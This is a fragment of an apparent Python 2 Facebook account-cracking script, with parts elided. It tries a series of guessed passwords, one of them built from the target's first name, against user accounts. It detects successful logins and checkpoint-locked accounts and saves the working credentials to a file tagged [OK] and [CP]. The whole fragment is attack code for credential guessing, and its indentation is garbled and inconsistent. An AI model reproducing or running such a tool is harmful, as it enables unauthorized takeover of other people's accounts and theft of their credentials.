	...
	def main(arg):
		...
		try:
			...
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				...
				if 'checkpoint' in xo:
					print '\x1b[0;33m   [Nazir] '+user+' • '+pass1+' • '+tl
					...
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\x1b[0;32m   [Tor] '+user+' • '+pass2+' • '+tl
						oke = open('done/Indo.txt', 'a')
						oke.write('\n[OK] '+user+' • '+pass2)
						oke.close()
						...
						if 'checkpoint' in xo:
							print '\x1b[0;33m   [Nazir] '+user+' • '+pass2+' • '+tl
							cek = open('done/Indo.txt', 'a')
							cek.write('\n[CP] '+user+' • '+pass2)
							cek.close()
							...
							pass3 = b['first_name'].lower()
                            				...
                            				xo = rex.content
                            				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                				print '\x1b[0;32m   [Tor] '+user+' • '+pass3+' • '+tl
                                				oke = open('done/Indo.txt', 'a')
                                				oke.write('\n[OK] '+user+' • '+pass3)
                                				oke.close()
                                				...
                                				if 'checkpoint' in xo:
                                    					print '\x1b[0;33m   [Nazir] '+user+' • '+pass3+' • '+tl
                                    					cek = open('done/Indo.txt', 'a')
                                    					cek.write('\n[CP] '+user+' • '+pass3)
                                    					cek.close()
                                    					...
                                    					xo = rex.content
                                    					if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        					print '\x1b[0;32m   [Tor] '+user+' • '+pass4+' • '+tl
                                        					oke = open('done/Indo.txt', 'a')
										oke.write('\n[OK] '+user+' • '+pass4)
                                        					oke.close()
                                        					...
                                        					if 'checkpoint' in xo:
                                            						print '\x1b[0;33m   [Nazir] '+user+' • '+pass4+' • '+tl
                                            						cek = open('done/Indo.txt', 'a')
                                            						cek.write('\n[CP] '+user+' • '+pass4)
                                            						cek.close()
                                    							...
                                    							xo = rex.content
                                    							if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        							print '\x1b[0;32m   [Tor] '+user+' • '+pass5+' • '+tl
                                        							oke = open('done/Indo.txt', 'a')
												oke.write('\n[OK] '+user+' • '+pass5)
                                        							oke.close()
                                        							...
                                        							if 'checkpoint' in xo:
                                            								print '\x1b[0;33m   [Nazir] '+user+' • '+pass5+' • '+tl
                                            								cek = open('done/Indo.txt', 'a')
                                            								cek.write('\n[CP] '+user+' • '+pass5)
                                            								cek.close()
                                    									...
                                    									xo = rex.content
                                    									if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        									print '\x1b[0;32m   [Tor] '+user+' • '+pass6+' • '+tl
                                        									oke = open('done/Indo.txt', 'a')
														oke.write('\n[OK] '+user+' • '+pass6)
                                        									oke.close()
                                        									...
                                        									if 'checkpoint' in xo:
                                            										print '\x1b[0;33m   [Nazir] '+user+' • '+pass6+' • '+tl
                                            										cek = open('done/Indo.txt', 'a')
                                            										cek.write('\n[CP] '+user+' • '+pass6)
                                            										cek.close()
                                    											...
                                    											xo = rex.content
                                    											if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        											print '\x1b[0;32m   [Tor] '+user+' • '+pass7+' • '+tl
                                        											oke = open('done/Indo.txt', 'a')
																oke.write('\n[OK] '+user+' • '+pass7)
                                        											oke.close()
                                        											...
                                        											if 'checkpoint' in xo:
                                            												print '\x1b[0;33m   [Nazir] '+user+' • '+pass7+' • '+tl
                                            												cek = open('done/Indo.txt', 'a')
                                            												cek.write('\n[CP] '+user+' • '+pass7)
                                            												cek.close()
                                    													...
                                    													xo = rex.content
                                    													if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        													print '\x1b[0;32m   [Tor] '+user+' • '+pass8+' • '+tl
                                        													oke = open('done/Indo.txt', 'a')
																		oke.write('\n[OK] '+user+' • '+pass8)
                                        													oke.close()
                                        													...
                                        													if 'checkpoint' in xo:
                                            														print '\x1b[0;33m   [Nazir] '+user+' • '+pass8+' • '+tl
                                            														cek = open('done/Indo.txt', 'a')
                                            														cek.write('\n[CP] '+user+' • '+pass8)
                                            														cek.close()
